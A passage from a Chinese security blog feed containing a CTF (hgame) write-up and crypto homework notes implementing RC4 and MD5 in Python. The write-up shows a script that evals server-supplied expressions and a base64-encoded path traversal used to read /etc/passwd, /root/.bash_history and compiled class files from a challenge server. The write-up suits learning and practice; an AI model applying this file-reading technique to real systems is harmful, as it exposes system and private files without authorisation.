class="string">"http://111.231.140.29:10000/solution"</span></span><br><span class="line">url4=<span class="string">'http://111.231.140.29:10000/statics/style.css'</span></span><br><span class="line"></span><br><span class="line">res = requests.post(url1,data=dict(token=token))</span><br><span class="line">cookies = res.cookies</span><br><span class="line">al_list = <span class="string">'1026943587'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="comment"># res = requests.get(url2,cookies=cookies,headers=headers)</span></span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    exp = re.findall(<span class="string">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">21</span>):</span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    exp = re.findall(<span class="string">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    exp = list(exp)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(exp)):</span><br><span class="line">        <span class="keyword">if</span> ord(exp[x])&gt;<span class="number">47</span> <span class="keyword">and</span> ord(exp[x]) &lt; <span class="number">59</span>:</span><br><span class="line">            exp[x] = al_list[ord(exp[x])<span class="number">-48</span>]</span><br><span class="line">    exp = <span class="string">""</span>.join(exp)</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>,<span class="number">31</span>):</span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    res = requests.get(url4,cookies=cookies,headers=headers)</span><br><span class="line">    exp = re.findall(<span class="string">r'content:"(.+)"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br></pre></td></tr></table></figure><p>flag如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;e7b2703a92574012c10a90d0c96051a5b38c8d60a8861c66e7a0898812144083&#125;</span><br></pre></td></tr></table></figure><h2 id="Math有趣"><a href="#Math有趣" class="headerlink" title="Math有趣"></a>Math有趣</h2><p>先是一道数学题，到了第二题之后是一个图片，点击图片链接，发现链接有猫腻<code>img/cXVlc3Rpb24ucG5n.php</code>，base64解码之后是<code>question.png</code>，尝试了一下<code>../../../../../etc/passwd</code>(base64编码)，发现可以成功读取文件<br><img src="https://i.loli.net/2019/02/12/5c623f9854da7.png" alt="/etc/passwd"><br>接下来就是探测工作目录了，学到一个东西，可以探测<code>.bash_history</code>，该文件记录了最近的bash命令<code>../../../../../root/.bash_history</code></p><p><img src="https://i.loli.net/2019/02/12/5c6240665dab0.png" alt=""></p><p>工作目录为<code>/usr/local/tomcat/webapps/ROOT</code></p><p>接下来我们可以给链接加<code>=</code>诱发报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.tan90.me:8080/img/cXVlc3Rpb24ucG5n=.php</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/12/5c6240ecc59e8.png" alt=""></p><p>最终定位到类目录，读取代码<code>../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class</code></p><p>然后反编译，定位到flag的位置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/flag"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数学问题可以用<strong>Baby Step Giant Step</strong>算法解决，github上有相关的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py bsgs.py 123852 6181254136845 612799081</span><br></pre></td></tr></table></figure><p>可以得到最小的答案是<code>15387368</code></p><p>flag如下：<code>hgame{15387368}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>密码学作业记录（二）</title>
    <link href="http://chaosec.top/2019/01/15/crypto2/"/>
    <id>http://chaosec.top/2019/01/15/crypto2/</id>
    <published>2019-01-15T15:26:17.000Z</published>
    <updated>2019-01-30T11:44:37.833Z</updated>
    
    <content type="html"><![CDATA[<p>接上篇</p><a id="more"></a><h1 id="序列密码"><a href="#序列密码" class="headerlink" title="序列密码"></a>序列密码</h1><h2 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h2><p>​RC4算法是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 </p><p><strong>算法原理：</strong></p><p>​RSA算法原理非常简单，256字节的状态向量S= {0，1，…，255}，用比特字节表示为S= {00000000, 00000001, ….，11111111}。用一个可变长度为1~256字节（8~8048位）的密钥来初始化256字节的状态向量S={S[0], S[1], …, S[255]}，任何时候，S都包含0~255的8位无符号数的排列组合。加密和解密时，密码流中的每一个字节k由S产生，通过系统的方式随机从S的256个元素中选取一个。每产生一个字节k，S的元素都要被再次排列。具体步骤如下:<br>​    </p><ul><li><p>步骤一：S向量原状态：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​S=[0,1,2,...,255]</span><br></pre></td></tr></table></figure></li><li><p>步骤二：创建临时向量T（256位），如果密钥K的长度为256位，则直接将K赋给T，否则一直重复复制K，直到填满256位的向量T </p></li><li>步骤三：接下来我们使用T向量来产生S的初始排列。这个过程从S[0]开始一直处理到S[255]，同时对每个S[i]，根据T[i指定的方案将S[i]与S的另一个元素进行交换： </li><li>步骤四：密码流产生。一旦S向量的初始排列完成后，密钥就不再被使用。接下来就是使用S自身来不断输出伪随机密码流的过程了。 </li><li>步骤五：加密。将步骤四中获得的随机字节k与明文的下一字节做异或运算，产生的字节即为对应的密文字节。 </li></ul><p>​解密时，由于加密只是使用密码流对明文做了异或运算，因此解密过程只需要使用相同步骤产生密码流并对密文进行同样的异或运算即可得到加密前的明文。 </p><p><strong>代码如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line">t = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化s</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">s.append(i);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 秘钥</span></span><br><span class="line"><span class="comment"># 通常取16字节</span></span><br><span class="line">k = [<span class="number">1</span>,<span class="number">45</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">123</span>,<span class="number">45</span>,<span class="number">78</span>,<span class="number">95</span>,<span class="number">65</span>,<span class="number">23</span>,<span class="number">44</span>,<span class="number">55</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为暂时向量t赋值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">t.append(k[i % len(k)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">j = (j+s[i]+t[i]) % <span class="number">256</span></span><br><span class="line">s[i],s[j] = s[j],s[i]</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'a.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">text = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 产生密钥流</span></span><br><span class="line">q = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> range(len(text)):</span><br><span class="line">i = (i+<span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">j = (j+s[i]) % <span class="number">256</span></span><br><span class="line">s[i],s[j] = s[j],s[i]</span><br><span class="line">t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">q.append(s[t])</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">t = (q[i] ^ text[i]) % <span class="number">128</span></span><br><span class="line">cipher += chr(t)</span><br><span class="line"></span><br><span class="line">plain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">t = (q[i] ^ ord(cipher[i])) % <span class="number">128</span></span><br><span class="line">plain += chr(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"d"</span>:</span><br><span class="line">print(<span class="string">"plain: "</span>)</span><br><span class="line">print(plain)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"cipher: "</span>)</span><br><span class="line">print(base64.b64encode(cipher.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><strong>实例演示：</strong></p><p>​    代码中加密的是一段英文文本，密文转为base64编码存储</p><p><img src="/2019/01/15/crypto2/1.png" alt="demo"></p><p><strong>安全性分析</strong></p><p>​    由于RC4算法加密采用的是xor异或运算，所以一旦子密钥序列出现了重复，密文就有可能被破解。 那么，RC4算法生成的子密钥序列是否会出现重复呢？由于存在部分弱密钥，使得子密钥序列在不到100万字节内就发生了完全的重复，如果是部分重复，则可能在不到10万字节内就能发生重复。所以在使用中应该对密钥进行检查。</p><p>​    根据目前的分析结果，没有任何的分析对于密钥长度达到128位的RC4有效，目前主要的攻击方法还是穷举攻击，所以到目前为止，RC4还算一个安全的加密算法。</p><p>​    2015年，比利时研究人员Mathy Vanhoef及Frank Piessens，公布了针对RC4加密算法的新型攻击程式，可在75小时内取得cookie的内容。  </p><p><strong>实用性分析</strong></p><p>​    RC4算法等序列密码加密过程较之分组密码而言相对简单，实现起来相对容易，在加密效率上对分组密码的优势是不言而喻的。此外，对于需要加密/解密数据流的应用，比如在数据通信信道或浏览器/网络链路上，流密码可能是更好的选择 。</p><hr><p>​    流密码在安全性强度上不逊分组密码，而加密速率又远优于后者，那是不是说明流密码可以完全取代分组密码呢？很可惜，答案是否定的。 </p><p>​    众所周知，分组密码的设计关键在于加解密算法，是明文和密文在密钥的控制下尽可能复杂，而序列密码的设计关键在于密钥序列产生器，使生成的密钥序列具有不可预测性。而密码序列产生器，也就是伪随机数字节流的产生，依赖种子（密钥）和伪随机函数，而如果种子和伪随机函数不变的情况下，每次产生的伪随机数字节流都是一样的。如果每次都用同样的密钥作为PRF的输入，产生同样的密码流来与两个不同的明文流分别进行异或运算得到两个密文流，那么将这两个密文流进行异或，结果就是两个原始明文的异或值。如果明文是文本字符串或其他已知其性质的字节流，那么密码破解很可能会成功。因此，对于这些已知性质的字节流进行流密码加密，密钥就不能被重复使用了。在这一点上，分组密码的优点就体现出来了。 </p><h1 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h1><p>​    哈希函数的单向性，压缩性，抗碰撞性等特点使得它能够解决实际应用中很多棘手的安全问题，诸如数字签名，文件指纹等。</p><h2 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a>MD5算法</h2><p>​    MD5(Message Digest Algorithm 5)，为计算机安全领域广泛使用的一种散列函数，用以提供消息的完整性保护。 </p><p>​    MD5是一种信息摘要算法，MD5算法对输入任意长度的消息进行运行，通过特定的hash散列方法将文本信息转换成产生一个128位的消息摘要，压缩+加密+hash算法的结合体，是绝对不可逆的。</p><p><strong>算法原理：</strong><br>​</p><ul><li>步骤一：数据填充。对消息进行数据填充，使消息的长度对512取模得448，设消息长度为X，即满    足X mod 512=448。根据此公式得出需要填充的数据长度。填充方法：在消息后面进行填充，填充第一位为1，其余为0。</li><li>步骤二：添加消息长度。在第一步结果之后再填充上原消息的长度，可用来进行的存储长度为64位。如果消息长度大于264，则只使用其低64位的值，即（消息长度 对 264取模）。在此步骤进行完毕后，最终消息长度就是512的整数倍。</li><li>步骤三：初始化链接变量。MD5使用4个32位的寄存器A、B、C、D，最开始存放4个固定的32位初始链接变量，这些参数用于第一轮迭代。</li><li>步骤四：分组处理。将每个分组（512比特）分成16个小组，每个小组32位，这些分组参与每轮16步的函数运算，输出为32位值，经过4轮（共有四个轮函数）共64步之后，得到的4个寄存器的值分别于输入链接变量进行模加，即得到此次分组处理的输入链接变量。第四轮最后一步完成后，再与该分组最初的寄存器的初值相加，然后把A、B、C、D的值作为下一个迭代压缩的链接变量输入，直到最后一个消息分组得到的A、B、C、D寄存器值级联输出作为128比特的消息散列值。</li></ul><p>​    此处需要特别指出的是，在MD5的代码实现中，要特别注意<strong>小端序</strong>和<strong>大端序</strong>的问题，这个问题如果不注意的话会导致MD5计算出错。而MD5的所有数据计算都是基于<strong>小端序</strong>的。</p><blockquote><p>小端字节序（Little Endian）：低位字节存放在低内存地址，高位字节存放在高内存地址端。  大端字节序（Big Endian）：高位字节存放在低内存地址，低位字节存放在高内存地址端。</p></blockquote><p>​    在步骤二中添加消息长度就要按照小端序的方法填充长度，同时轮函数中各个参数也要按照小端序来计算，这点一定要特别注意。</p><p>​    还有对于需要处理多个分组的情况，要做好A、B、C、D寄存器的及时更新，否则无法得到正确的MD5值。</p><p><em>代码如下：</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串转为2进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(s)</span>:</span></span><br><span class="line">text = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">text += <span class="string">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 附加填充，输入为字母明文，输出为二进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">additonal_filling</span><span class="params">(data)</span>:</span></span><br><span class="line">bin_data = str2bin(data)</span><br><span class="line">origi_mess_len = len(bin_data)</span><br><span class="line"><span class="keyword">if</span> origi_mess_len &gt; math.pow(<span class="number">2</span>,<span class="number">64</span>):</span><br><span class="line">print(<span class="string">'Message too long!'</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">bit_origi_mess_len = <span class="string">f'<span class="subst">&#123;bin(origi_mess_len)[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">64</span>&#125;</span>'</span></span><br><span class="line">mod_remain = origi_mess_len % <span class="number">512</span>  <span class="comment"># 余数</span></span><br><span class="line"><span class="keyword">if</span> mod_remain &lt; <span class="number">449</span>:</span><br><span class="line">padding_len = <span class="number">448</span> - mod_remain</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">padding_len = <span class="number">448</span> - mod_remain + <span class="number">512</span></span><br><span class="line"><span class="keyword">if</span> padding_len == <span class="number">1</span>:</span><br><span class="line">bin_data += <span class="string">'1'</span></span><br><span class="line"><span class="keyword">elif</span> padding_len &gt; <span class="number">1</span>:</span><br><span class="line">bin_data = bin_data + <span class="string">'1'</span> + <span class="string">'0'</span> * (padding_len<span class="number">-1</span>)</span><br><span class="line">left = bit_origi_mess_len[:<span class="number">32</span>]</span><br><span class="line">right = bit_origi_mess_len[<span class="number">32</span>:]</span><br><span class="line">left = left[<span class="number">24</span>:<span class="number">32</span>] + left[<span class="number">16</span>:<span class="number">24</span>] + left[<span class="number">8</span>:<span class="number">16</span>] + left[:<span class="number">8</span>]</span><br><span class="line">right = right[<span class="number">24</span>:<span class="number">32</span>] + right[<span class="number">16</span>:<span class="number">24</span>] + right[<span class="number">8</span>:<span class="number">16</span>] + right[:<span class="number">8</span>]</span><br><span class="line"><span class="comment"># 32为为一组</span></span><br><span class="line">bin_data += (right + left)</span><br><span class="line"><span class="keyword">return</span> bin_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代压缩，输出为分组比特消息数组，每组的长度为512bit</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iter_compress</span><span class="params">(bdata)</span>:</span></span><br><span class="line">group_mess = [[]*<span class="number">16</span>] <span class="comment"># 分组消息数组</span></span><br><span class="line">print(len(bdata))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bdata)//<span class="number">512</span>):</span><br><span class="line">temp = bdata[i*<span class="number">512</span>:i*<span class="number">512</span>+<span class="number">512</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">print(temp[j*<span class="number">32</span>:j*<span class="number">32</span>+<span class="number">32</span>])</span><br><span class="line">group_mess[i].append(temp[j*<span class="number">32</span>:j*<span class="number">32</span>+<span class="number">32</span>])</span><br><span class="line"><span class="keyword">return</span> group_mess</span><br><span class="line"></span><br><span class="line"><span class="comment"># 小端序处理 @input hex</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">little_endian</span><span class="params">(x,n)</span>:</span></span><br><span class="line">x = <span class="string">f'<span class="subst">&#123;bin(x)[<span class="number">2</span>:]:<span class="number">0</span>&gt;&#123;n&#125;</span>&#125;'</span></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n//<span class="number">8</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">ans += x[(i<span class="number">-1</span>)*<span class="number">8</span>:i*<span class="number">8</span>]</span><br><span class="line"><span class="keyword">return</span> int(ans,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于逻辑非比较特殊，所以另外实现一下,输入为16进制数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_operate</span><span class="params">(data)</span>:</span></span><br><span class="line">data = <span class="string">f'<span class="subst">&#123;bin(data)[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">32</span>&#125;</span>'</span></span><br><span class="line">out = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line"><span class="keyword">if</span> i == <span class="string">"0"</span>:</span><br><span class="line">out += <span class="string">"1"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">out += <span class="string">"0"</span></span><br><span class="line"><span class="keyword">return</span> int(out,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 四个非线性函数,输入均为32bit的三个数据</span></span><br><span class="line"><span class="comment"># @input hex</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">F</span><span class="params">(x, y, z)</span>:</span></span><br><span class="line"><span class="keyword">return</span> (x&amp;y) | (not_operate(x) &amp; z)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">G</span><span class="params">(x,y,z)</span>:</span></span><br><span class="line"><span class="keyword">return</span> (x &amp; z) | (y &amp; not_operate(z))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">H</span><span class="params">(x,y,z)</span>:</span></span><br><span class="line"><span class="keyword">return</span> (x ^ y ^ z)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">I</span><span class="params">(x,y,z)</span>:</span></span><br><span class="line"><span class="keyword">return</span> y ^ (x | not_operate(z))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate_move</span><span class="params">(x,n)</span>:</span></span><br><span class="line">x = <span class="string">f'<span class="subst">&#123;bin(x)[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">32</span>&#125;</span>'</span></span><br><span class="line"><span class="keyword">return</span> int(x[n:] + x[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># t[i]，返回10进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_t</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="keyword">return</span> int(math.pow(<span class="number">2</span>,<span class="number">32</span>) * abs(math.sin(i)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># @input digital</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FF</span><span 